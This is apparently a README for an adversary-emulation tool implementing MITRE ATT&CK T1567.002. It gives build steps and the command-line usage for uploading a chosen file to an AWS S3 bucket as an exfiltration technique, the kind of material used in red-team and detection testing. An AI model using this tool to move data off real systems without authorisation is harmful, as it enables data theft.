# T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage

Implementation of [T1567.002](https://attack.mitre.org/techniques/T1567/002) - Exfiltration Over Web Service: Exfiltration to Cloud Storage.

## Features

- Upload files to AWS S3 buckets

## Prerequisites

- [.NET SDK](https://dotnet.microsoft.com/download)
- [Task](https://taskfile.dev) for building
- AWS Account with S3 access
- AWS Access Key and Secret Key

## Setup

Configure your AWS credentials:

- Replace the following constants in `Program.cs` with your values:

  ```csharp
  accessKey = "your-access-key"
  secretKey = "your-secret-key"
  ```

## Build

Build for your current platform:

```bash
task build
```

Publish for a specific platform:

```bash
# Windows x64
task publish

# Linux x64
task publish RUNTIME=linux-x64

# macOS x64
task publish RUNTIME=osx-x64
```

## Usage

The application accepts the following command-line arguments:

```bash
t1567-002 <upload> <file_path> <bucket_name> [region]
```

- `upload`: Operation to perform
- `file_path`: Path to the file
- `bucket_name`: Name of the S3 bucket
- `region`: Optional AWS region (defaults to us-east-1)

## Note

Ensure your AWS credentials have appropriate permissions to perform the required S3 operations.
